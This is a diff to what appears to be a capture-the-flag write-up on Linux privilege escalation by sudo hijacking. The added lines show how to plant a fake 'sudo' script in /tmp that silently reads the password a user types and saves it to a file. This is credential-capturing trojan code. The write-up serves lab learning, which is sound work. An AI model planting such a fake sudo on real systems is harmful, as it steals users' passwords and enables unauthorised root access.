@@ -15,7 +15,17 @@ User frank is logging in via ssh and then running the command `sudo cat /etc/sha
 3. Time for [sudo hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-hijacking)  
 While creating our sudo executable, we have to be a little bit creative. Trying to get a reverse shell won't be useful. If u hijack sudo so that it spawns a reverse shell instead, the reverse shell u get back would be of the frank user because the sudo elevation hasn't happened yet. Instead we can capture the password entered by frank using a little bit of shell scripting. (Thanks you xyro for these words 😁).  
 
-    Follow these steps to capture the password using our sudo executable.
+    Follow these steps to capture the password using our sudo executable.  
+    1. `touch /tmp/sudo` creating our own sudo executable int tmp directory.  
+    2. Content of sudo executable  
+    ```
+        #!/bin/bash  
+        read -s pass # after executes the command, this will read the password entered by frank and store it in the pass variable  
+        echo $pass > /home/frank/pass.txt # echoing the password from pass variable to pass.txt so that we can read it once catured. 
+    ```
+
+
+
 <p>
     <strong>Intended way :</strong>
     <ul>
